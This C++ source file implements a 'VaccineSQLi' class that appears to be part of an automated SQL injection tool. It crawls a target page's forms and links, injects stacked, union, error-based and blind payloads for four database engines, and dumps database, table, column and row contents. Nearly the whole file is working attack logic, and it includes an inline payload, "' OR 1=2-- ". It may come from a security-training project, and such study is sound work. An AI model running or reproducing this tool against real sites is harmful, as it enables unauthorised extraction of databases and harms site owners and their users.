#include "../../include/class/vaccine/sqli/VaccineSQLi.hpp"

VaccineSQLi::VaccineSQLi() : Vaccine()
{
        this->_worker_init();
}

VaccineSQLi::VaccineSQLi(
    const uint8& db_type,
    const std::string& url,
    const std::string& request_type,
    const str_vector& headers,
    const std::string& archive_file)
    : Vaccine(db_type, url, request_type, headers, archive_file)
{
        this->_worker_init();
}

VaccineSQLi::VaccineSQLi(const VaccineSQLi& other) : Vaccine(other)
{
        *this = other;
}

VaccineSQLi::~VaccineSQLi()
{

        if (this->_html_doc)
        {
                xmlFreeDoc(*this->_html_doc);
                delete this->_html_doc;
        }
}

VaccineSQLi& VaccineSQLi::operator=(const VaccineSQLi& other)
{
        if (this != &other)
        {
                this->Vaccine::operator=(other);
                if (this->_html_doc)
                {
                        xmlFreeDoc(*this->_html_doc);
                        delete this->_html_doc;
                        this->_html_doc = NULL;
                }
                if (other._html_doc)
                        this->_html_doc = new htmlDocPtr(*other._html_doc);
                this->_gates = other._gates;

                this->_method_type = other._method_type;
                this->_full_url = other._full_url;
                this->_parameters = other._parameters;
                this->_payloads = other._payloads;
                this->_ft_payload = other._ft_payload;
                this->_ft_parser = other._ft_parser;
        }
        return *this;
}

bool VaccineSQLi::fetch_data()
{
        if (!this->_fetch_html())
                return false;

        htmlDocPtr html_doc = htmlReadMemory(
            this->_html.c_str(),
            this->_html.size(),
            "noname.html",
            NULL,
            HTML_PARSE_RECOVER | HTML_PARSE_NOERROR | HTML_PARSE_NOWARNING);
        if (!html_doc)
        {
                std::cerr << "[ ERROR ] htmlReadMemory() failed." << std::endl;
                return false;
        }
        if (this->_html_doc)
        {
                xmlFreeDoc(*this->_html_doc);
                delete this->_html_doc;
                this->_html_doc = NULL;
        }
        this->_html_doc = new htmlDocPtr(html_doc);
        if (!this->_html_doc)
        {
                xmlFreeDoc(html_doc);
                xmlCleanupParser();
                std::cerr << "[ ERROR ] new htmlDocPtr() failed." << std::endl;
                return false;
        }
        this->_parse_html(xmlDocGetRootElement(*this->_html_doc));
        xmlCleanupParser();
        return true;
}

void VaccineSQLi::process(const uint8& method_type)
{
        uint8 count = 1;
        if (this->_db_type == ALL)
                count = 4;
        for (uint8 i = 0; i < count; ++i)
        {
                if (count != 1)
                        this->_db_type = i + 1;
                switch (method_type)
                {
                case STACKED:
                        this->stacked_queries();
                        break;
                case UNION:
                        this->union_based();
                        break;
                case ERROR:
                        this->error_based();
                        break;
                case BLIND:
                        this->blind_based();
                        break;
                default:
                        break;
                }
        }
        if (count != 1)
                this->_db_type = ALL;
}

void VaccineSQLi::stacked_queries()
{
        if (this->_db_type == ALL)
                std::cerr << "[ ERROR ] Please select a specific database type first."
                          << std::endl;
        if (this->_db_type != MYSQL)
        {
                std::cout << "[ INFO ] Can't perform stacked queries SQLi"
                          << " on " << this->db_type_tostr() << "."
                          << std::endl;
                return;
        }
        this->_method_type = STACKED;
        this->_launch(t_config({
            sptr_vector(),
            sptr_vector(),
            sptr_vector(),
            sptr_vector(),
        }));
}

void VaccineSQLi::union_based()
{
        if (this->_db_type == ALL)
                std::cerr << "[ ERROR ] Please select a specific database type first."
                          << std::endl;
        std::string offset;
        this->_method_type = UNION;
        this->_launch(t_config({
            sptr_vector({&offset}),
            sptr_vector({&offset, &offset}),
            (this->_db_type != SQLITE
                 ? sptr_vector({&offset})
                 : sptr_vector({&offset, &offset})),
            sptr_vector({&offset}),
        }));
}

void VaccineSQLi::error_based()
{
        if (this->_db_type == ALL)
        {
                std::cerr << "[ ERROR ] Please select a specific database type first."
                          << std::endl;
                return;
        }
        if (this->_db_type == SQLITE)
        {
                std::cerr << "[ ERROR ] Can't perform error based SQLi"
                          << " on " << this->db_type_tostr() << "."
                          << std::endl;
                return;
        }
        std::string index = "0";
        this->_method_type = ERROR;
        this->_launch(t_config({
            sptr_vector({&index, &index}),
            sptr_vector({&index, &index}),
            sptr_vector({&index, &index}),
            sptr_vector({&index, &index}),
        }));
}

void VaccineSQLi::blind_based()
{
        if (this->_db_type == ALL)
                std::cerr << "[ ERROR ] Please select a specific database type first."
                          << std::endl;
        std::string record;
        std::string index = "0";
        std::string str_start = "1";
        std::string str = "!";
        std::string buffer;
        this->_method_type = BLIND;
        if (this->_db_type != POSTGRESQL && this->_db_type != SQLITE)
                this->_databases["ab"] = std::vector< int >();
        else if (this->_db_type != SQLITE)
                this->_databases["public"] = std::vector< int >();
        this->_launch(t_config({
            sptr_vector({&record, &index, &str_start, &str, &buffer, &buffer}),
            sptr_vector({&record, &index, &str_start, &str, &buffer, &buffer}),
            sptr_vector({&record, &index, &str_start, &str, &buffer, &buffer}),
            sptr_vector({&record, &index, &str_start, &str, &buffer, &buffer}),
        }));
}

// ===================================================================== //
// =========================== P R I V A T E =========================== //
// ===================================================================== //

void VaccineSQLi::_worker_init()
{
        this->_html_doc = NULL;
        this->_gates = std::vector< xmlNode* >();

        this->_method_type = 0;
        this->_full_url = std::string();
        this->_parameters = str_vector();
        this->_payloads = str_vector();
        this->_ft_payload = NULL;
        this->_ft_parser = NULL;
}

// ==================================================== INIT
void VaccineSQLi::_parse_html(xmlNode* node)
{
        for (node = node; node; node = node->next)
        {
                if (node->type == XML_ELEMENT_NODE)
                {
                        if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")) ||
                            !xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("a")))
                                this->_gates.push_back(node);
                }
                if (node->children)
                        this->_parse_html(node->children);
        }
}

void VaccineSQLi::_launch(t_config base_config)
{
        if (!this->_init_launch())
                return;
        t_config config(base_config);
        for (const auto& node : this->_gates)
        {
                if (!this->_init_attempt(
                        node, this->_full_url,
                        this->_parameters, config))
                        continue;
                std::cout << "[ INFO ] Testing " << this->_sqli_method_tostr()
                          << " SQLi on " << this->_full_url << "."
                          << "[ " << this->db_type_tostr() << " ]"
                          << std::endl;
                // =============================== DATABASES
                if (this->_databases.empty())
                        this->_fetch(config[DATABASES], DATABASES, std::string(), 0);
                // =============================== TABLES
                for (const auto& db : this->_databases)
                        this->_fetch(config[TABLES], TABLES,
                                     db.first, 0);
                // =============================== COLUMNS
                for (const auto& db : this->_databases)
                        for (const auto& tab_index : db.second)
                                this->_fetch(config[COLUMNS], COLUMNS,
                                             db.first, tab_index);
                // =============================== VALUES
                for (const auto& db : this->_databases)
                        for (const auto& tab_index : db.second)
                                this->_fetch(config[VALUES], VALUES,
                                             db.first, tab_index);
                // =============================== END
                if (!this->_databases.empty())
                        this->_save_results(
                            this->_full_url.substr(0, this->_full_url.find('?')),
                            this->_parameters,
                            this->_payloads,
                            std::string(this->_sqli_method_tostr() + " SQLi"));
                else
                        std::cout << "[ INFO ] " << this->_sqli_method_tostr()
                                  << " SQLi failed on " << this->_full_url << "."
                                  << "[ " << this->db_type_tostr() << " ]"
                                  << std::endl;
                this->_payloads.clear();
                this->_parameters.clear();

                this->_databases.clear();
                this->_tables.clear();
                this->_columns.clear();
                this->_values.clear();
                config = base_config;
        }
}

bool VaccineSQLi::_init_launch()
{
        if (!this->_data_check())
                return false;
        switch (this->_db_type)
        {
        case MYSQL:
                this->_excluded = sqli_mysql::excluded;
                break;
        case POSTGRESQL:
                this->_excluded = sqli_postgresql::excluded;
                break;
        case MICROSOFTSQL:
                this->_excluded = sqli_microsoftsql::excluded;
                break;
        case SQLITE:
                this->_excluded = sqli_sqlite::excluded;
                if (this->_method_type == BLIND)
                {
                        this->_excluded.push_back("superusers");
                        this->_excluded.push_back("users");
                }
                break;
        default:
                return false;
        }
        return true;
}

bool VaccineSQLi::_data_check() const
{
        if (this->_html.empty())
        {
                std::cerr << "[ ERROR ] Please fetch_data() first." << std::endl;
                return false;
        }
        if (this->_gates.empty())
        {
                std::cerr << "[ ERROR ] " << this->_url
                          << " has no managed SQLi entrypoint." << std::endl;
                return false;
        }
        return true;
}

std::string VaccineSQLi::_sqli_method_tostr() const
{
        switch (this->_method_type)
        {
        case STACKED:
                return "stacked queries";
        case UNION:
                return "union based";
        case ERROR:
                return "error based";
        case BLIND:
                return "blind based";
        default:
                return "... wait, what ?";
        }
}

bool VaccineSQLi::_init_attempt(
    const xmlNode* node,
    std::string& url,
    str_vector& parameters,
    t_config& config)
{
        if (this->_db_type == SQLITE)
                this->_databases["root"] = std::vector< int >();

        if (!node || node->type != XML_ELEMENT_NODE)
                return false;

        xmlChar* gate = NULL;
        if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")))
        {
                gate = xmlGetProp(node, reinterpret_cast< const xmlChar* >("action"));
                this->_parse_form(node, parameters);
        }
        else if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("a")))
        {
                gate = xmlGetProp(node, reinterpret_cast< const xmlChar* >("href"));
                this->_parse_link(node, parameters);
        }
        if (!gate)
                return false;
        url = this->_url + std::string(reinterpret_cast< char* >(gate));
        xmlFree(gate);
        if (this->_method_type == BLIND)
                *config[0][BLIND_BASED_RECORD] = this->_process(
                    url, this->_fill_parameters(parameters, "' OR 1=2-- "));
        return true;
}

void VaccineSQLi::_parse_form(
    const xmlNode* node,
    str_vector& parameters) const
{
        xmlChar* name = NULL;
        for (xmlNode* child = node->children; child; child = child->next)
        {
                if (child->children)
                        this->_parse_form(child, parameters);

                if (child->type != XML_ELEMENT_NODE ||
                    xmlStrcasecmp(child->name, reinterpret_cast< const xmlChar* >("input")))
                        continue;
                name = xmlGetProp(child, reinterpret_cast< const xmlChar* >("name"));
                if (!name)
                        continue;
                parameters.push_back(std::string(reinterpret_cast< char* >(name)));
                xmlFree(name);
        }
}

void VaccineSQLi::_parse_link(
    const xmlNode* node,
    str_vector& parameters) const
{
        xmlChar* href = xmlGetProp(node, reinterpret_cast< const xmlChar* >("href"));
        if (!href)
                return;
        const std::string query(reinterpret_cast< char* >(href));
        const size_t pos = query.find('?');
        if (pos != std::string::npos)
        {
                std::istringstream iss(query.substr(pos + 1));
                std::string parameter;
                while (std::getline(iss, parameter, '&'))
                {
                        size_t delimiter = parameter.find('=');
                        if (delimiter != std::string::npos)
                                parameters.push_back(parameter.substr(0, delimiter));
                }
        }
        xmlFree(href);
}

void VaccineSQLi::_fetch(
    sptr_vector& config,
    const uint8& value_type,
    const std::string& db_name,
    const int& tab_index)
{
        switch (this->_db_type)
        {
        case MYSQL:
                this->_ft_payload = sqli_mysql::payload;
                this->_ft_parser = sqli_mysql::parser;
                break;
        case POSTGRESQL:
                this->_ft_payload = sqli_postgresql::payload;
                this->_ft_parser = sqli_postgresql::parser;
                break;
        case MICROSOFTSQL:
                this->_ft_payload = sqli_microsoftsql::payload;
                this->_ft_parser = sqli_microsoftsql::parser;
                break;
        case SQLITE:
                this->_ft_payload = sqli_sqlite::payload;
                this->_ft_parser = sqli_sqlite::parser;
                break;
        default:
                return;
        }
        if (!this->_ft_payload || !this->_ft_parser)
                return;

        if (value_type == DATABASES)
        {
                this->_fetch_databases(config, value_type);
                return;
        }
        std::string index = db_name;
        config.push_back(&index);

        if (value_type == TABLES)
                this->_fetch_tables(config, value_type, index);
        else if (value_type == COLUMNS)
                this->_fetch_columns(config, value_type, tab_index);
        else if (value_type == VALUES)
                this->_fetch_values(config, value_type, tab_index);
}

void VaccineSQLi::_fetch_databases(
    sptr_vector& config,
    const uint8& value_type)
{
        uint8 timeout = TIMEOUT;
        std::string payload;
        str_vector parameters;
        str_vector response;
        while (true)
        {
                if (this->_method_type == UNION &&
                    this->_databases.empty() &&
                    --timeout == 0)
                        break;

                payload = this->_ft_payload(
                    config,
                    this->_method_type,
                    value_type);
                this->_payloads.push_back(payload);

                parameters = this->_fill_parameters(
                    this->_parameters,
                    payload);

                response = this->_ft_parser(
                    this->_process(this->_full_url, parameters),
                    config,
                    this->_method_type);

                if (!this->_manage(
                        value_type, response,
                        config, NULL, NULL))
                        break;
        }
}

void VaccineSQLi::_fetch_tables(
    sptr_vector& config,
    const uint8& value_type,
    std::string& db_name)
{
        uint8 timeout = TIMEOUT;
        std::string payload;
        str_vector parameters;
        str_vector response;
        while (true)
        {
                if (this->_db_type == SQLITE &&
                    this->_method_type == UNION &&
                    this->_databases.empty() &&
                    --timeout == 0)
                        break;

                payload = this->_ft_payload(
                    config,
                    this->_method_type,
                    value_type);
                this->_payloads.push_back(payload);

                parameters = this->_fill_parameters(
                    this->_parameters,
                    payload);

                response = this->_ft_parser(
                    this->_process(this->_full_url, parameters),
                    config,
                    this->_method_type);

                if (!this->_manage(
                        value_type, response,
                        config, NULL, &db_name))
                        break;
        }
}

void VaccineSQLi::_fetch_columns(
    sptr_vector& config,
    const uint8& value_type,
    const int& tab_index)
{
        if (tab_index < 0)
                return;
        int index;
        std::string payload;
        std::string tab_name;
        str_vector parameters;
        str_vector response;
        config.push_back(NULL);
        for (const auto& table : this->_tables[tab_index])
        {
                while (true)
                {
                        tab_name = table.first;
                        config.back() = &tab_name;
                        payload = this->_ft_payload(
                            config,
                            this->_method_type,
                            value_type);
                        this->_payloads.push_back(payload);

                        parameters = this->_fill_parameters(
                            this->_parameters,
                            payload);

                        response = this->_ft_parser(
                            this->_process(this->_full_url, parameters),
                            config,
                            this->_method_type);

                        index = tab_index;
                        if (!this->_manage(
                                value_type, response,
                                config, &index, &tab_name))
                                break;
                }
        }
}

void VaccineSQLi::_fetch_values(
    sptr_vector& config,
    const uint8& value_type,
    const int& tab_index)
{
        if (tab_index < 0)
                return;
        int index;
        std::string payload;
        std::string tab_name;
        std::string col_name;
        str_vector parameters;
        str_vector response;
        config.push_back(NULL);
        config.push_back(NULL);
        for (const auto& table : this->_tables[tab_index])
        {
                index = this->_tables.at(tab_index).at(table.first);
                if (index < 0)
                        continue;

                tab_name = table.first;
                config[config.size() - 2] = &tab_name;
                for (auto& column : this->_columns[index])
                {
                        while (true)
                        {
                                col_name = column.first;
                                config.back() = &col_name;
                                payload = this->_ft_payload(
                                    config,
                                    this->_method_type,
                                    value_type);
                                this->_payloads.push_back(payload);

                                parameters = this->_fill_parameters(
                                    this->_parameters,
                                    payload);

                                response = this->_ft_parser(
                                    this->_process(this->_full_url, parameters),
                                    config,
                                    this->_method_type);

                                if (!this->_manage(
                                        value_type, response,
                                        config, &index, &col_name))
                                        break;
                        }
                }
        }
}

str_vector VaccineSQLi::_fill_parameters(
    const str_vector& old_parameters,
    const std::string& payload) const
{
        str_vector new_parameters(old_parameters);
        for (auto& parameter : new_parameters)
                parameter = "\"" + parameter + "\": \"" + payload + "\"";
        return new_parameters;
}

// ==================================================== PROCESS
std::string VaccineSQLi::_process(
    const std::string& url,
    const str_vector& parameters) const
{
        std::string buffer;
        CURL* curl = curl_easy_init();
        if (!curl)
        {
                std::cerr << "[ ERROR ] curl_easy_init() failed." << std::endl;
                return buffer;
        }
        curl_slist* header_list = curl_slist_append(
            NULL, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, std::string(url).c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, VaccineSQLi::_curl_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
        for (const auto& header : this->_headers)
                header_list = curl_slist_append(header_list, header.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);

        if (this->_request_type == "GET")
                this->_process_get(url, parameters, &curl);
        else if (this->_request_type == "POST")
                this->_process_post(parameters, &curl);

        curl_easy_cleanup(curl);
        curl_slist_free_all(header_list);
        return buffer;
}

void VaccineSQLi::_process_get(
    const std::string& url,
    const str_vector& parameters,
    CURL** curl) const
{
        std::string key;
        std::string value;
        std::stringstream ss;
        std::string query = "?";
        char* encoded_value = NULL;
        for (const auto& entry : parameters)
        {
                ss = std::stringstream(entry);
                std::getline(ss, key, ':');
                std::getline(ss, value);

                if (key.size() < 2 || value.size() < 3)
                        continue;
                key = key.substr(1, key.length() - 2);
                value = value.substr(2, value.length() - 3);
                encoded_value = curl_easy_escape(*curl, value.c_str(), 0);
                if (encoded_value)
                {
                        query += key + "=" + std::string(encoded_value) + "&";
                        curl_free(encoded_value);
                }
        }
        query.pop_back();
        std::string payload = url + query;
        curl_easy_setopt(*curl, CURLOPT_URL, payload.c_str());
        CURLcode res = curl_easy_perform(*curl);
        if (res != CURLE_OK)
                std::cerr << "[ ERROR ] curl_easy_perform() failed: "
                          << curl_easy_strerror(res) << std::endl;
}

void VaccineSQLi::_process_post(
    const str_vector& parameters,
    CURL** curl) const
{
        std::string payload = "{ ";
        for (const auto& entry : parameters)
                payload += entry + ", ";
        if (payload.size() >= 2)
        {
                payload.pop_back();
                payload.pop_back();
        }
        payload += " }";
        curl_easy_setopt(*curl, CURLOPT_POSTFIELDSIZE, payload.size());
        curl_easy_setopt(*curl, CURLOPT_POSTFIELDS, payload.c_str());
        CURLcode res = curl_easy_perform(*curl);
        if (res != CURLE_OK)
                std::cerr << "[ ERROR ] curl_easy_perform() failed: "
                          << curl_easy_strerror(res) << std::endl;
}

// ==================================================== MANAGE
bool VaccineSQLi::_manage(
    const uint8& value_type,
    const str_vector& response,
    sptr_vector& config,
    const int* tab_index,
    const std::string* tab_name)
{
        switch (this->_method_type)
        {
        case STACKED:
                return this->_manage_stacked_queries(
                    value_type,
                    response,
                    tab_index,
                    tab_name);
        case UNION:
                return this->_manage_union_based(
                    value_type,
                    response,
                    tab_index,
                    tab_name);
        case ERROR:
                return this->_manage_error_based(
                    value_type,
                    response,
                    config,
                    tab_index,
                    tab_name);
        case BLIND:
                return this->_manage_blind_based(
                    value_type,
                    response,
                    config,
                    tab_index,
                    tab_name);
        default:
                return STOP;
        }
}

bool VaccineSQLi::_manage_stacked_queries(
    const uint8& value_type,
    const str_vector& response,
    const int* tab_index,
    const std::string* tab_name)
{
        if (response.empty())
                return STOP;
        int index;
        switch (value_type)
        {
        case DATABASES:
                for (const auto& value : response)
                        if (std::find(
                                this->_excluded.begin(),
                                this->_excluded.end(),
                                value) == this->_excluded.end())
                                this->_databases[value] = std::vector< int >();
                return STOP;
        case TABLES:
                index = this->_tables.size();
                this->_tables.push_back(std::unordered_map< std::string, int >());
                this->_databases[*tab_name].push_back(index);

                for (const auto& value : response)
                        this->_tables[index][value] = -1;
                return STOP;
        case COLUMNS:
                index = this->_columns.size();
                this->_columns.push_back(std::unordered_map< std::string, int >());
                this->_tables[*tab_index][*tab_name] = index;

                for (const auto& value : response)
                        this->_columns[index][value] = -1;
                return STOP;
        case VALUES:
                index = this->_values.size();
                this->_values.push_back(str_vector());
                this->_columns[*tab_index][*tab_name] = index;

                for (const auto& value : response)
                        this->_values[index].push_back(value);
                return STOP;
        default:
                return STOP;
        }
}

bool VaccineSQLi::_manage_union_based(
    const uint8& value_type,
    const str_vector& response,
    const int* tab_index,
    const std::string* tab_name)
{
        if (response.empty())
                return (value_type == DATABASES ||
                        (value_type == TABLES && this->_db_type == SQLITE));
        int index;
        switch (value_type)
        {
        case DATABASES:
                for (const auto& value : response)
                        if (std::find(
                                this->_excluded.begin(),
                                this->_excluded.end(),
                                value) == this->_excluded.end())
                                this->_databases[value] = std::vector< int >();
                return STOP;
        case TABLES:
                index = this->_tables.size();
                this->_tables.push_back(std::unordered_map< std::string, int >());
                this->_databases[*tab_name].push_back(index);

                for (const auto& value : response)
                        if (this->_db_type != SQLITE)
                                this->_tables[index][value] = -1;
                        else if (std::find(
                                     this->_excluded.begin(),
                                     this->_excluded.end(),
                                     value) == this->_excluded.end())
                                this->_tables[index][value] = -1;
                return STOP;
        case COLUMNS:
                index = this->_columns.size();
                this->_columns.push_back(std::unordered_map< std::string, int >());
                this->_tables[*tab_index][*tab_name] = index;

                for (const auto& value : response)
                        this->_columns[index][value] = -1;
                return STOP;
        case VALUES:
                index = this->_values.size();
                this->_values.push_back(str_vector());
                this->_columns[*tab_index][*tab_name] = index;

                for (const auto& value : response)
                        this->_values[index].push_back(value);
                return STOP;
        default:
                return STOP;
        }
}

bool VaccineSQLi::_manage_error_based(
    const uint8& value_type,
    const str_vector& response,
    sptr_vector& config,
    const int* tab_index,
    const std::string* tab_name)
{
        if (response.empty())
        {
                config[ERROR_BASED_MARKED] = config[ERROR_BASED_INDEX];
                return STOP;
        }
        int index;
        const std::string elem = response[0];
        switch (value_type)
        {
        case DATABASES:
                if (std::find(
                        this->_excluded.begin(),
                        this->_excluded.end(),
                        elem) == this->_excluded.end())
                        this->_databases[elem] = std::vector< int >();
                return CONTINUE;
        case TABLES:
                index = this->_tables.size();
                if (config[ERROR_BASED_MARKED])
                {
                        this->_tables.push_back(std::unordered_map< std::string, int >());
                        this->_databases[*tab_name].push_back(index);
                        config[ERROR_BASED_MARKED] = NULL;
                }
                else
                        index--;
                this->_databases[*tab_name].back() = index;
                this->_tables[index][elem] = -1;
                return CONTINUE;
        case COLUMNS:
                index = this->_columns.size();
                if (config[ERROR_BASED_MARKED])
                {
                        this->_columns.push_back(std::unordered_map< std::string, int >());
                        config[ERROR_BASED_MARKED] = NULL;
                }
                else
                        index--;
                this->_tables[*tab_index][*tab_name] = index;
                this->_columns[index][elem] = -1;
                return CONTINUE;
        case VALUES:
                index = this->_values.size();
                if (config[ERROR_BASED_MARKED])
                {
                        this->_values.push_back(str_vector());
                        config[ERROR_BASED_MARKED] = NULL;
                }
                else
                        index--;
                this->_columns[*tab_index][*tab_name] = index;
                this->_values[index].push_back(elem);
                return CONTINUE;
        default:
                return CONTINUE;
        }
}

bool VaccineSQLi::_manage_blind_based(
    const uint8& value_type,
    const str_vector& response,
    sptr_vector& config,
    const int* tab_index,
    const std::string* tab_name)
{
        if (!response.empty())
        {
                *config[BLIND_BASED_BUFFER] += response[0];
                return CONTINUE;
        }
        if ((*config[BLIND_BASED_CMP])[0] != 127)
                return CONTINUE;

        *config[BLIND_BASED_CMP] = "!";
        *config[BLIND_BASED_CMP_START] = "1";

        int index = std::stoi(*config[BLIND_BASED_INDEX]);
        *config[BLIND_BASED_INDEX] = "0";
        if ((*config[BLIND_BASED_BUFFER]).empty())
        {
                config[BLIND_BASED_MARKED] = config[BLIND_BASED_INDEX];
                return STOP;
        }
        *config[BLIND_BASED_INDEX] = std::to_string(index + 1);

        switch (value_type)
        {
        case DATABASES:
                if (std::find(
                        this->_excluded.begin(),
                        this->_excluded.end(),
                        *config[BLIND_BASED_BUFFER]) == this->_excluded.end())
                        this->_databases[*config[BLIND_BASED_BUFFER]] = std::vector< int >();
                break;
        case TABLES:
                index = this->_tables.size();
                if (config[BLIND_BASED_MARKED])
                {
                        this->_tables.push_back(std::unordered_map< std::string, int >());
                        this->_databases[*tab_name].push_back(index);
                        config[BLIND_BASED_MARKED] = NULL;
                }
                else
                        index--;
                if (this->_db_type != SQLITE)
                        this->_tables[index][*config[BLIND_BASED_BUFFER]] = -1;
                else if (std::find(
                             this->_excluded.begin(),
                             this->_excluded.end(),
                             *config[BLIND_BASED_BUFFER]) == this->_excluded.end())
                        this->_tables[index][*config[BLIND_BASED_BUFFER]] = -1;
                break;
        case COLUMNS:
                index = this->_columns.size();
                if (config[BLIND_BASED_MARKED])
                {
                        this->_columns.push_back(std::unordered_map< std::string, int >());
                        this->_tables[*tab_index][*tab_name] = index;
                        config[BLIND_BASED_MARKED] = NULL;
                }
                else
                        index--;
                this->_columns[index][*config[BLIND_BASED_BUFFER]] = -1;
                break;
        case VALUES:
                index = this->_values.size();
                if (config[BLIND_BASED_MARKED])
                {
                        this->_values.push_back(str_vector());
                        this->_columns[*tab_index][*tab_name] = index;
                        config[BLIND_BASED_MARKED] = NULL;
                }
                else
                        index--;
                this->_values[index].push_back(*config[BLIND_BASED_BUFFER]);
                break;
        default:
                return STOP;
        }
        (*config[BLIND_BASED_BUFFER]).clear();
        return CONTINUE;
}